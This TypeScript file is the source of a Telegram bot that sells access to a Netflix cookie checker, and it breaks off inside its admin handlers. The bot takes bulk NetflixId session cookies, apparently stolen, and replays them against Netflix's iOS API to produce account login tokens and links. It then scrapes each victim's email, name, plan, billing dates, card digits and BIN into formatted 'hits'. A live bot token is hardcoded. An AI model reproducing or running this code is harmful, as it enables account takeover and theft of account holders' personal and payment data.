// @ts-nocheck
import TelegramBot from "node-telegram-bot-api";
import AdmZip from "adm-zip";
import { Storage } from "./storage";

const BOT_TOKEN = "8742801785:AAGXMZeugnbuZL3QDG6lbQXB3gP1jAJSJMw";
const OWNER_ID = "7606499525";
const DAILY_LIMIT = Infinity;

const CHANNELS = [
  { url: "https://t.me/ThunderVault8", id: "@ThunderVault8" },
  { url: "https://t.me/netflixhivea", id: "@netflixhivea" },
  { url: "https://t.me/allichetools", id: "@allichetools" },
  { url: "https://t.me/+9njmxL1yJuA4YjE6", id: "" },
  { url: "https://t.me/+zBedda3BFAphZjIx", id: "" },
];

export function setupBot() {
  const bot = new TelegramBot(BOT_TOKEN, { polling: true });
  const storage = new Storage();
  const pending: Record<number, { action: string }> = {};
  const cancelled = new Set<number>();
  let botUsername = "";

  console.log("🔑 NF Token Bot initializing...");

  bot.getMe().then(me => {
    botUsername = me.username || "";
    console.log(`✅ NF Token Bot running: @${me.username}`);
  });

  const uncheckableChannels = new Set<string>();

  async function checkChannelMembership(userId: number, chatId: string): Promise<boolean> {
    try {
      const member = await bot.getChatMember(chatId, userId);
      return ["member", "administrator", "creator"].includes(member.status);
    } catch (err: any) {
      const msg = err?.message || "";
      if (msg.includes("chat not found") || msg.includes("bot is not a member") || msg.includes("Bad Request")) {
        uncheckableChannels.add(chatId);
        return true;
      }
      if (msg.includes("user not found") || msg.includes("USER_NOT_PARTICIPANT")) {
        return false;
      }
      return true;
    }
  }

  async function checkAllChannels(userId: number): Promise<boolean> {
    for (const ch of CHANNELS) {
      if (!ch.id || ch.url.includes("/+")) continue;
      if (uncheckableChannels.has(ch.id)) continue;
      const ok = await checkChannelMembership(userId, ch.id);
      if (!ok) return false;
    }
    return true;
  }

  function joinChannelsKeyboard(): TelegramBot.InlineKeyboardButton[][] {
    const rows: TelegramBot.InlineKeyboardButton[][] = [];
    CHANNELS.forEach((ch, i) => {
      rows.push([{ text: `📢 Channel ${i + 1}`, url: ch.url }]);
    });
    rows.push([{ text: "✅ I Joined All", callback_data: "check_joined" }]);
    return rows;
  }

  async function sendJoinMessage(chatId: number) {
    await bot.sendMessage(chatId,
      `⚠️ <b>You must join all channels first!</b>\n\nJoin the channels below, then click "I Joined All":`,
      { parse_mode: "HTML", reply_markup: { inline_keyboard: joinChannelsKeyboard() } }
    );
  }

  function isOwner(userId: number): boolean {
    return String(userId) === OWNER_ID;
  }

  function mainMenu(): TelegramBot.InlineKeyboardButton[][] {
    return [
      [{ text: "🔑 NF Token Checker", callback_data: "nf_token" }],
      [{ text: "🔴 Netflix Full Check", callback_data: "nf_checker" }],
      [{ text: "👤 My Profile", callback_data: "profile" }, { text: "👑 VIP Subscribe", callback_data: "vip_info" }],
      [{ text: "🔗 Referral Link", callback_data: "referral" }],
    ];
  }

  function adminMenu(): TelegramBot.InlineKeyboardButton[][] {
    const config = storage.getConfig();
    const nfStatus = config.netflixLocked ? "🔒" : "🔓";
    return [
      [{ text: "📊 Bot Stats", callback_data: "admin_stats" }],
      [{ text: "👑 VIP Users", callback_data: "admin_vip" }, { text: "➕ Add VIP", callback_data: "admin_add_vip" }],
      [{ text: `${nfStatus} Netflix: ${config.netflixLocked ? "Locked" : "Open"}`, callback_data: config.netflixLocked ? "admin_unlock_nf" : "admin_lock_nf" }],
      [{ text: "📢 Broadcast", callback_data: "admin_broadcast" }],
      [{ text: "🚫 Ban User", callback_data: "admin_ban_prompt" }, { text: "✅ Unban User", callback_data: "admin_unban_prompt" }],
      [{ text: "🚫 Banned Users", callback_data: "admin_banned" }],
      [{ text: "👥 All Users", callback_data: "admin_users" }],
      [{ text: "🔗 Referral Settings", callback_data: "admin_referral" }],
      [{ text: "🔙 Main Menu", callback_data: "main_menu" }],
    ];
  }

  const COUNTRY_NAMES: Record<string, string> = {
    TR: "Turkey", US: "United States", GB: "United Kingdom", DE: "Germany", FR: "France",
    BR: "Brazil", IN: "India", JP: "Japan", KR: "South Korea", CA: "Canada", AU: "Australia",
    IT: "Italy", ES: "Spain", MX: "Mexico", AR: "Argentina", CL: "Chile", CO: "Colombia",
    SA: "Saudi Arabia", AE: "UAE", EG: "Egypt", PH: "Philippines", TH: "Thailand", ID: "Indonesia",
    MY: "Malaysia", SG: "Singapore", PK: "Pakistan", BD: "Bangladesh", NL: "Netherlands",
    BE: "Belgium", SE: "Sweden", NO: "Norway", DK: "Denmark", FI: "Finland", PL: "Poland",
    PT: "Portugal", GR: "Greece", RO: "Romania", HU: "Hungary", CZ: "Czech Republic",
    IL: "Israel", ZA: "South Africa", NG: "Nigeria", KE: "Kenya", TW: "Taiwan", HK: "Hong Kong",
  };

  function getCountryFlag(code: string): string {
    if (!code || code.length !== 2) return "🌍";
    try {
      return String.fromCodePoint(...[...code.toUpperCase()].map(c => 0x1F1E6 + c.charCodeAt(0) - 65));
    } catch { return "🌍"; }
  }

  function esc(s: string): string {
    return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
  }

  function cleanCookie(raw: string): string {
    let c = raw.trim();
    if (c.startsWith("NetflixId=")) c = c.substring("NetflixId=".length);
    if (c.startsWith("netflixid=")) c = c.substring("netflixid=".length);
    const semicolonIdx = c.indexOf(";");
    if (semicolonIdx !== -1) c = c.substring(0, semicolonIdx);
    return c.trim();
  }

  function parseCookiesFromText(text: string): string[] {
    const lines = text.split(/[\n\r]+/);
    const cookies: string[] = [];
    for (const line of lines) {
      const trimmed = line.trim();
      if (!trimmed || trimmed.length < 10) continue;
      if (trimmed.startsWith("#") || trimmed.startsWith("//")) continue;
      const parts = trimmed.split(/[,\t|]+/);
      for (const part of parts) {
        const cleaned = cleanCookie(part);
        if (cleaned.length >= 10) {
          cookies.push(cleaned);
        }
      }
    }
    return cookies;
  }

  interface BinInfo {
    brand?: string;
    type?: string;
    level?: string;
    bank?: string;
    country?: string;
    countryFlag?: string;
  }

  async function lookupBin(cardLast4: string, fullBin?: string): Promise<BinInfo | null> {
    if (!fullBin || fullBin.length < 6) return null;
    const bin = fullBin.replace(/\D/g, "").substring(0, 6);
    if (bin.length < 6) return null;
    try {
      const res = await fetch(`https://lookup.binlist.net/${bin}`, {
        headers: { "Accept-Version": "3" },
        signal: AbortSignal.timeout(5000),
      });
      if (res.status !== 200) return null;
      const data: any = await res.json();
      return {
        brand: data.scheme || undefined,
        type: data.type || undefined,
        level: data.brand || undefined,
        bank: data.bank?.name || undefined,
        country: data.country?.alpha2 || undefined,
        countryFlag: data.country?.emoji || undefined,
      };
    } catch { return null; }
  }

  interface NFCheckResult {
    success: boolean;
    token?: string;
    loginUrl?: string;
    expires?: string;
    country?: string;
    countryName?: string;
    plan?: string;
    price?: string;
    email?: string;
    name?: string;
    memberSince?: string;
    nextBilling?: string;
    payment?: string;
    cardInfo?: string;
    cardBin?: string;
    binInfo?: BinInfo;
    phone?: string;
    quality?: string;
    streams?: string;
    profiles?: string[];
    profileCount?: number;
    membershipStatus?: string;
    error?: string;
    cookie?: string;
  }

  async function checkNetflixCookie(netflixId: string): Promise<NFCheckResult> {
    try {
      const url = "https://ios.prod.ftl.netflix.com/iosui/user/15.48";
      const params = new URLSearchParams({
        appVersion: "15.48.1",
        config: '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
        device_type: "NFAPPL-02-",
        esn: "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        idiom: "phone",
        iosVersion: "15.8.5",
        isTablet: "false",
        languages: "en-US",
        locale: "en-US",
        maxDeviceWidth: "375",
        model: "saget",
        modelType: "IPHONE8-1",
        odpAware: "true",
        path: '["account","token","default"]',
        pathFormat: "graph",
        pixelDensity: "2.0",
        progressive: "false",
        responseFormat: "json",
      });

      const headers: Record<string, string> = {
        "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
        "x-netflix.request.attempt": "1",
        "x-netflix.client.idiom": "phone",
        "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
        "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
        "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
        "x-netflix.context.app-version": "15.48.1",
        "x-netflix.argo.translated": "true",
        "x-netflix.context.form-factor": "phone",
        "x-netflix.context.sdk-version": "2012.4",
        "x-netflix.client.appversion": "15.48.1",
        "x-netflix.context.max-device-width": "375",
        "x-netflix.context.ab-tests": "",
        "x-netflix.client.type": "argo",
        "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        "x-netflix.context.locales": "en-US",
        "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        "x-netflix.client.iosversion": "15.8.5",
        "accept-language": "en-US;q=1",
        "x-netflix.context.os-version": "15.8.5",
        "x-netflix.request.client.context": '{"appState":"foreground"}',
        "x-netflix.context.ui-flavor": "argo",
        "x-netflix.argo.nfnsm": "9",
        "x-netflix.context.pixel-density": "2.0",
        "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        "x-netflix.request.client.timezoneid": "Asia/Dhaka",
        "Cookie": `NetflixId=${netflixId}`,
      };

      const res = await fetch(`${url}?${params.toString()}`, { headers, signal: AbortSignal.timeout(30000) });
      const rawText = await res.text();

      if (res.status !== 200) return { success: false, error: `HTTP ${res.status}` };

      let data: any;
      try { data = JSON.parse(rawText); } catch { return { success: false, error: "JSON parse failed" }; }

      const account = data?.value?.account;
      if (!account) return { success: false, error: "Invalid response / expired cookie" };

      const tokenInfo = account?.token?.default;
      if (!tokenInfo?.token) return { success: false, error: "No token in response" };

      const tokenValue = tokenInfo.token;
      const expiresMs = tokenInfo.expires;
      const expiresDate = new Date(expiresMs).toISOString();
      const loginUrl = `https://netflix.com/account?nftoken=${tokenValue}`;

      const result: NFCheckResult = {
        success: true,
        token: tokenValue,
        loginUrl,
        expires: expiresDate,
        country: "Unknown",
        countryName: "Unknown",
        plan: "Unknown",
        email: "",
        name: "",
        cookie: netflixId,
      };

      try {
        const deep = (obj: any, ...keys: string[]) => {
          let v = obj;
          for (const k of keys) { v = v?.[k]; if (v === undefined) return undefined; }
          return v;
        };
        result.email = account.email || account.emailAddress || deep(account, "userInfo", "email") || "";
        result.name = account.firstName || deep(account, "userInfo", "firstName") || "";
        const ms = account.membershipStatus || {};
        result.country = ms.countryOfSignup || ms.currentCountry || account.countryOfSignup || deep(account, "userInfo", "countryOfSignup") || "Unknown";
        result.countryName = COUNTRY_NAMES[result.country] || result.country;
        result.plan = ms.currentPlanName || ms.planName || deep(account, "planDetails", "planName") || "Unknown";
      } catch {}

      try {
        const acctRes = await fetch("https://www.netflix.com/YourAccount", {
          headers: {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Cookie": `NetflixId=${netflixId}`,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
          },
          redirect: "follow",
          signal: AbortSignal.timeout(15000),
        });
        const html = await acctRes.text();
        const reactMatch = html.match(/netflix\.reactContext\s*=\s*({.+?});\s*<\/script>/s);
        if (reactMatch) {
          const ctx = JSON.parse(reactMatch[1].replace(/\\x([0-9a-fA-F]{2})/g, (_: any, hex: string) => String.fromCharCode(parseInt(hex, 16))));
          const findInObj = (obj: any, key: string, depth = 0): any => {
            if (!obj || typeof obj !== "object" || depth > 8) return undefined;
            if (obj[key] !== undefined) return obj[key];
            for (const k of Object.keys(obj)) {
              const r = findInObj(obj[k], key, depth + 1);
              if (r !== undefined) return r;
            }
            return undefined;
          };

          if (!result.email) result.email = findInObj(ctx, "memberEmail") || findInObj(ctx, "email") || "";
          if (!result.name) result.name = findInObj(ctx, "firstName") || "";

          const country = findInObj(ctx, "countryOfSignup") || findInObj(ctx, "currentCountry") || "";
          if (country && result.country === "Unknown") {
            result.country = country;
            result.countryName = COUNTRY_NAMES[country] || country;
          }

          const plan = findInObj(ctx, "currentPlanName") || findInObj(ctx, "planName") || "";
          if (plan && result.plan === "Unknown") result.plan = plan;

          const price = findInObj(ctx, "currentPlanPrice") || findInObj(ctx, "planPrice");
          if (price) {
            const curr = findInObj(ctx, "planCurrency") || findInObj(ctx, "currencyCode") || "";
            result.price = curr ? `${price} ${curr}` : String(price);
          }

          const memberSince = findInObj(ctx, "memberSince") || findInObj(ctx, "startDate");
          if (memberSince) {
            const d = new Date(memberSince);
            if (!isNaN(d.getTime())) result.memberSince = d.toLocaleDateString("en-US", { month: "long", year: "numeric" });
          }

          const nextBill = findInObj(ctx, "nextBillingDate") || findInObj(ctx, "nextPaymentDate");
          if (nextBill) {
            const d = new Date(nextBill);
            if (!isNaN(d.getTime())) result.nextBilling = d.toLocaleDateString("en-US", { day: "numeric", month: "short", year: "numeric" });
          }

          const payType = findInObj(ctx, "currentPaymentType") || findInObj(ctx, "paymentType");
          if (payType) result.payment = payType;

          const card = findInObj(ctx, "lastFourDigits") || findInObj(ctx, "cardLastFourDigits");
          if (card) result.cardInfo = `****${card}`;

          const cardBin = findInObj(ctx, "bin") || findInObj(ctx, "cardBin") || findInObj(ctx, "firstSixDigits");
          if (cardBin) result.cardBin = String(cardBin);

          result.membershipStatus = findInObj(ctx, "membershipStatus") || findInObj(ctx, "userStatus");
          result.quality = findInObj(ctx, "videoQuality") || findInObj(ctx, "hdAvailable") ? "HD/UHD" : "";

          const profiles = findInObj(ctx, "profiles");
          if (profiles && typeof profiles === "object") {
            const pList: string[] = [];
            const arr = Array.isArray(profiles) ? profiles : Object.values(profiles);
            for (const p of arr) {
              if (p?.firstName) pList.push(p.firstName);
              else if (p?.profileName) pList.push(p.profileName);
            }
            if (pList.length > 0) {
              result.profiles = pList;
              result.profileCount = pList.length;
            }
          }
        }
      } catch {}

      if (result.cardBin) {
        try {
          result.binInfo = await lookupBin(result.cardInfo || "", result.cardBin) || undefined;
        } catch {}
      }

      return result;
    } catch (err: any) {
      return { success: false, error: err.message || "Unknown error" };
    }
  }

  function formatNFHit(h: NFCheckResult, idx: number): string {
    const flag = getCountryFlag(h.country || "");
    let msg = `✅ <b>Hit #${idx}</b>\n${"─".repeat(25)}\n`;
    msg += `${flag} <b>Country:</b> ${esc(h.countryName || h.country || "Unknown")}\n`;
    msg += `📦 <b>Plan:</b> ${esc(h.plan || "Unknown")}\n`;
    if (h.price) msg += `💰 <b>Price:</b> ${esc(h.price)}\n`;
    if (h.email) msg += `📧 <b>Email:</b> <code>${esc(h.email)}</code>\n`;
    if (h.name) msg += `👤 <b>Name:</b> ${esc(h.name)}\n`;
    if (h.memberSince) msg += `📅 <b>Member Since:</b> ${esc(h.memberSince)}\n`;
    if (h.nextBilling) msg += `💳 <b>Next Billing:</b> ${esc(h.nextBilling)}\n`;
    if (h.payment) msg += `💳 <b>Payment:</b> ${esc(h.payment)}\n`;
    if (h.cardInfo) msg += `💳 <b>Card:</b> ${esc(h.cardInfo)}\n`;
    if (h.binInfo) {
      let binStr = "";
      if (h.binInfo.brand) binStr += `${h.binInfo.brand} `;
      if (h.binInfo.type) binStr += `${h.binInfo.type} `;
      if (h.binInfo.level) binStr += `${h.binInfo.level} `;
      if (h.binInfo.bank) binStr += `| ${h.binInfo.bank} `;
      if (h.binInfo.country) binStr += `${h.binInfo.countryFlag || ""} ${h.binInfo.country}`;
      if (binStr.trim()) msg += `🏦 <b>BIN:</b> ${esc(binStr.trim())}\n`;
    }
    if (h.profiles && h.profiles.length > 0) msg += `👥 <b>Profiles (${h.profileCount}):</b> ${h.profiles.map(esc).join(", ")}\n`;
    if (h.token) msg += `\n🔑 <b>Token:</b> <code>${esc(h.token)}</code>\n`;
    if (h.loginUrl) msg += `🔗 <a href="${esc(h.loginUrl)}">Login Link</a>\n`;
    msg += `\n<i>Checked by @XK6271</i>`;
    return msg;
  }

  function formatNFHitPlain(h: NFCheckResult, idx: number): string {
    let line = `═══ Hit #${idx} ═══\n`;
    line += `Country: ${h.countryName || h.country || "Unknown"}\n`;
    line += `Plan: ${h.plan || "Unknown"}\n`;
    if (h.price) line += `Price: ${h.price}\n`;
    if (h.email) line += `Email: ${h.email}\n`;
    if (h.name) line += `Name: ${h.name}\n`;
    if (h.memberSince) line += `Member Since: ${h.memberSince}\n`;
    if (h.nextBilling) line += `Next Billing: ${h.nextBilling}\n`;
    if (h.payment) line += `Payment: ${h.payment}\n`;
    if (h.cardInfo) line += `Card: ${h.cardInfo}\n`;
    if (h.binInfo) {
      let binStr = "";
      if (h.binInfo.brand) binStr += `${h.binInfo.brand} `;
      if (h.binInfo.type) binStr += `${h.binInfo.type} `;
      if (h.binInfo.level) binStr += `${h.binInfo.level} `;
      if (h.binInfo.bank) binStr += `| ${h.binInfo.bank} `;
      if (h.binInfo.country) binStr += `${h.binInfo.country}`;
      if (binStr.trim()) line += `BIN: ${binStr.trim()}\n`;
    }
    if (h.profiles && h.profiles.length > 0) line += `Profiles (${h.profileCount}): ${h.profiles.join(", ")}\n`;
    if (h.token) line += `Token: ${h.token}\n`;
    if (h.loginUrl) line += `Login: ${h.loginUrl}\n`;
    return line;
  }

  async function extractFileText(msg: TelegramBot.Message): Promise<string | null> {
    if (!msg.document) return null;
    const doc = msg.document;
    const fname = (doc.file_name || "").toLowerCase();
    try {
      const fileLink = await bot.getFileLink(doc.file_id);
      const fileRes = await fetch(fileLink);
      if (fname.endsWith(".zip")) {
        const arrayBuf = await fileRes.arrayBuffer();
        const zip = new AdmZip(Buffer.from(arrayBuf));
        const entries = zip.getEntries();
        const allFiles = entries.filter(e => !e.isDirectory);
        let text = "";
        for (const entry of allFiles) {
          const content = entry.getData().toString("utf8");
          if (content.length > 10) text += content + "\n";
        }
        await bot.sendMessage(msg.chat.id, `📦 ZIP: extracted ${allFiles.length} file(s)`, { parse_mode: "HTML" });
        return text;
      } else {
        return await fileRes.text();
      }
    } catch (err: any) {
      await bot.sendMessage(msg.chat.id, `❌ Error reading file: ${err.message}`);
      return null;
    }
  }

  bot.onText(/\/start(.*)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from!.id;
    const username = msg.from?.username || "";
    const firstName = msg.from?.first_name || "";
    const startParam = (match?.[1] || "").trim();

    let referredBy: string | undefined;
    if (startParam.startsWith(" ref_") || startParam.startsWith("ref_")) {
      const refId = startParam.replace(/^\s*ref_/, "");
      if (refId && refId !== String(userId)) {
        const existing = storage.getUser(String(userId));
        if (!existing) {
          referredBy = refId;
        }
      }
    }

    const isNew = !storage.getUser(String(userId));
    storage.getOrCreateUser(String(userId), username, firstName, referredBy);

    if (isNew && referredBy) {
      const refUser = storage.getUser(referredBy);
      const bonus = storage.getConfig().referralBonus;
      if (refUser) {
        try {
          await bot.sendMessage(Number(referredBy),
            `🎉 <b>New Referral!</b>\n\n${esc(firstName)} joined using your link!\n🎁 You earned <b>+${bonus}</b> bonus checks!`,
            { parse_mode: "HTML" }
          );
        } catch {}
      }
    }

    if (CHANNELS.length > 0 && !await checkAllChannels(userId)) {
      return sendJoinMessage(chatId);
    }

    await bot.sendMessage(chatId,
      `🔑 <b>Netflix Login Token Checker</b>\n${"─".repeat(30)}\n\nWelcome, <b>${esc(firstName)}</b>!\n\nChoose an option below:`,
      { parse_mode: "HTML", reply_markup: { inline_keyboard: mainMenu() } }
    );
  });

  bot.onText(/\/cancel/, async (msg) => {
    const userId = msg.from!.id;
    if (pending[userId]) {
      cancelled.add(userId);
      delete pending[userId];
      await bot.sendMessage(msg.chat.id, "⛔ Cancelled.", {
        reply_markup: { inline_keyboard: mainMenu() }
      });
    }
  });

  bot.onText(/\/admin/, async (msg) => {
    if (!isOwner(msg.from!.id)) return;
    await bot.sendMessage(msg.chat.id,
      `🛡️ <b>Admin Panel</b>\n${"─".repeat(30)}`,
      { parse_mode: "HTML", reply_markup: { inline_keyboard: adminMenu() } }
    );
  });

  bot.onText(/\/vip (.+)/, async (msg, match) => {
    if (!isOwner(msg.from!.id)) return;
    const args = match![1].split(" ");
    const targetId = args[0];
    const days = args[1] ? parseInt(args[1]) : undefined;
    storage.setVip(targetId, days);
    await bot.sendMessage(msg.chat.id, `✅ VIP granted to ${targetId}${days ? ` for ${days} days` : " (permanent)"}`);
  });

  bot.onText(/\/unvip (.+)/, async (msg, match) => {
    if (!isOwner(msg.from!.id)) return;
    storage.removeVip(match![1]);
    await bot.sendMessage(msg.chat.id, `✅ VIP removed from ${match![1]}`);
  });

  bot.onText(/\/ban (.+)/, async (msg, match) => {
    if (!isOwner(msg.from!.id)) return;
    storage.banUser(match![1]);
    await bot.sendMessage(msg.chat.id, `⛔ Banned user ${match![1]}`);
  });

  bot.onText(/\/unban (.+)/, async (msg, match) => {
    if (!isOwner(msg.from!.id)) return;
    storage.unbanUser(match![1]);
    await bot.sendMessage(msg.chat.id, `✅ Unbanned user ${match![1]}`);
  });

  bot.onText(/\/setbonus (\d+)/, async (msg, match) => {
    if (!isOwner(msg.from!.id)) return;
    const bonus = parseInt(match![1]);
    storage.setReferralBonus(bonus);
    await bot.sendMessage(msg.chat.id, `✅ Referral bonus set to ${bonus} checks`);
  });

  bot.on("callback_query", async (query) => {
    const chatId = query.message!.chat.id;
    const userId = query.from.id;
    const data = query.data!;

    await bot.answerCallbackQuery(query.id).catch(() => {});

    if (data === "cancel_check") {
      cancelled.add(userId);
      return;
    }

    if (data === "check_joined") {
      const ok = await checkAllChannels(userId);
      if (!ok) return sendJoinMessage(chatId);
      const username = query.from.username || "";
      const firstName = query.from.first_name || "";
      storage.getOrCreateUser(String(userId), username, firstName);
      return bot.sendMessage(chatId,
        `🔑 <b>Netflix Login Token Checker</b>\n${"─".repeat(30)}\n\nWelcome, <b>${esc(firstName)}</b>!\n\nChoose an option below:`,
        { parse_mode: "HTML", reply_markup: { inline_keyboard: mainMenu() } }
      );
    }

    if (data === "main_menu") {
      return bot.sendMessage(chatId,
        `🔑 <b>Netflix Login Token Checker</b>\n${"─".repeat(30)}\n\nChoose an option:`,
        { parse_mode: "HTML", reply_markup: { inline_keyboard: mainMenu() } }
      );
    }

    if (storage.isBanned(String(userId))) {
      return bot.sendMessage(chatId, "⛔ You are banned from using this bot.");
    }

    if (data === "nf_token") {
      const config = storage.getConfig();
      if (config.netflixLocked && !isOwner(userId)) {
        return bot.sendMessage(chatId, "🔒 Netflix is currently locked by admin.", {
          reply_markup: { inline_keyboard: [[{ text: "🔙 Main Menu", callback_data: "main_menu" }]] }
        });
      }

      const vip = storage.isVip(String(userId)) || isOwner(userId);
      const used = storage.getDailyChecks(String(userId));
      if (!vip && used >= DAILY_LIMIT) {
        return bot.sendMessage(chatId,
          `⚠️ Daily limit reached (<b>${DAILY_LIMIT}</b>).\n\n👑 Get VIP for unlimited!\nContact: @XK6271`,
          { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "👑 VIP Info", callback_data: "vip_info" }, { text: "🔙 Menu", callback_data: "main_menu" }]] } }
        );
      }

      const remaining = vip ? "♾️ Unlimited" : `${DAILY_LIMIT - used} remaining`;
      pending[userId] = { action: "nf_token_only" };
      return bot.sendMessage(chatId,
        `🔑 <b>NF Token Generator</b>\n${"─".repeat(30)}\n\n📊 ${remaining}\n\n📋 Send Netflix cookies (NetflixId values)\n\n🔑 This mode extracts <b>only the login token</b> — fast and simple!\n\n📝 <b>Format:</b>\n• One cookie per line\n• 📄 File (.txt, .csv, .json)\n• 📦 .zip archive\n\n💡 Send cookies now or /cancel`,
        { parse_mode: "HTML" }
      );
    }

    if (data === "nf_checker") {
      const config = storage.getConfig();
      if (config.netflixLocked && !isOwner(userId)) {
        return bot.sendMessage(chatId, "🔒 Netflix is currently locked by admin.", {
          reply_markup: { inline_keyboard: [[{ text: "🔙 Main Menu", callback_data: "main_menu" }]] }
        });
      }

      const vip = storage.isVip(String(userId)) || isOwner(userId);
      const used = storage.getDailyChecks(String(userId));
      if (!vip && used >= DAILY_LIMIT) {
        return bot.sendMessage(chatId,
          `⚠️ Daily limit reached (<b>${DAILY_LIMIT}</b>).\n\n👑 Get VIP for unlimited!\nContact: @XK6271`,
          { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "👑 VIP Info", callback_data: "vip_info" }, { text: "🔙 Menu", callback_data: "main_menu" }]] } }
        );
      }

      const remaining = vip ? "♾️ Unlimited" : `${DAILY_LIMIT - used} remaining`;
      pending[userId] = { action: "nf_check" };
      return bot.sendMessage(chatId,
        `🔴 <b>Netflix Full Checker</b>\n${"─".repeat(30)}\n\n📊 ${remaining}\n\n📋 Send Netflix cookies (NetflixId values)\n\n🔍 Full check: token + plan + email + country + BIN + more!\n\n📝 <b>Format:</b>\n• One cookie per line\n• 📄 File (.txt, .csv, .json)\n• 📦 .zip archive\n\n💡 Send cookies now or /cancel`,
        { parse_mode: "HTML" }
      );
    }

    if (data === "vip_info") {
      const vip = storage.isVip(String(userId));
      let text = `👑 <b>VIP Subscription</b>\n${"─".repeat(30)}\n\n`;
      if (vip) {
        const u = storage.getUser(String(userId));
        text += `✅ <b>Status:</b> Active\n`;
        if (u?.vipExpiresAt) {
          text += `⏳ <b>Expires:</b> ${new Date(u.vipExpiresAt).toLocaleDateString()}\n`;
        } else {
          text += `⏳ <b>Expires:</b> Never (Permanent)\n`;
        }
      } else {
        text += `❌ <b>Status:</b> Not VIP\n\n`;
        text += `✨ <b>VIP Benefits:</b>\n`;
        text += `• ♾️ Unlimited daily checks\n`;
        text += `• ⚡ Priority checking\n`;
        text += `• 🔑 All features unlocked\n\n`;
        text += `📩 Contact: @XK6271`;
      }
      return bot.sendMessage(chatId, text, {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: [[{ text: "🔙 Main Menu", callback_data: "main_menu" }]] }
      });
    }

    if (data === "profile") {
      const u = storage.getUser(String(userId));
      if (!u) {
        return bot.sendMessage(chatId, "❌ Profile not found. Send /start first.");
      }
      const vip = storage.isVip(String(userId));
      const used = storage.getDailyChecks(String(userId));
      const remaining = vip ? "♾️" : `${Math.max(0, DAILY_LIMIT - used)}`;
      let text = `👤 <b>Your Profile</b>\n${"─".repeat(30)}\n\n`;
      text += `🆔 <b>ID:</b> <code>${u.telegramId}</code>\n`;
      text += `👤 <b>Name:</b> ${esc(u.firstName)}\n`;
      if (u.username) text += `📛 <b>Username:</b> @${esc(u.username)}\n`;
      text += `📅 <b>Joined:</b> ${new Date(u.joinedAt).toLocaleDateString()}\n`;
      text += `👑 <b>VIP:</b> ${vip ? "✅ Active" : "❌ No"}\n`;
      text += `📊 <b>Today's Checks:</b> ${used}\n`;
      text += `📊 <b>Remaining:</b> ${remaining}\n`;
      text += `🎁 <b>Bonus Checks:</b> ${u.bonusChecks || 0}\n`;
      text += `👥 <b>Referrals:</b> ${u.referralCount || 0}\n`;
      return bot.sendMessage(chatId, text, {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: [[{ text: "🔙 Main Menu", callback_data: "main_menu" }]] }
      });
    }

    if (data === "referral") {
      const refLink = `https://t.me/${botUsername}?start=ref_${userId}`;
      const u = storage.getUser(String(userId));
      const bonus = storage.getConfig().referralBonus;
      let text = `🔗 <b>Your Referral Link</b>\n${"─".repeat(30)}\n\n`;
      text += `<code>${refLink}</code>\n\n`;
      text += `👥 <b>Total Referrals:</b> ${u?.referralCount || 0}\n`;
      text += `🎁 <b>Bonus per referral:</b> +${bonus} checks\n`;
      text += `🎁 <b>Your bonus checks:</b> ${u?.bonusChecks || 0}\n\n`;
      text += `Share your link and earn bonus checks!`;
      return bot.sendMessage(chatId, text, {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: [[{ text: "🔙 Main Menu", callback_data: "main_menu" }]] }
      });
    }

    if (data === "admin_panel" || data === "admin_back") {
      if (!isOwner(userId)) return;
      return bot.sendMessage(chatId, `🛡️ <b>Admin Panel</b>\n${"─".repeat(30)}`, {
        parse_mode: "HTML", reply_markup: { inline_keyboard: adminMenu() }
      });
    }

    if (data === "admin_stats") {
      if (!isOwner(userId)) return;
      const stats = storage.getStats();
      return bot.sendMessage(chatId,
        `📊 <b>Bot Statistics</b>\n${"─".repeat(30)}\n\n👥 Total Users: ${stats.totalUsers}\n📊 Checks Today: ${stats.checksToday}\n👑 Active VIPs: ${stats.activeVips}\n🚫 Banned: ${stats.bannedUsers}\n👥 Referrals: ${stats.totalReferrals}`,
        { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "🔙 Admin", callback_data: "admin_back" }]] } }
      );
    }

    if (data === "admin_vip") {
      if (!isOwner(userId)) return;
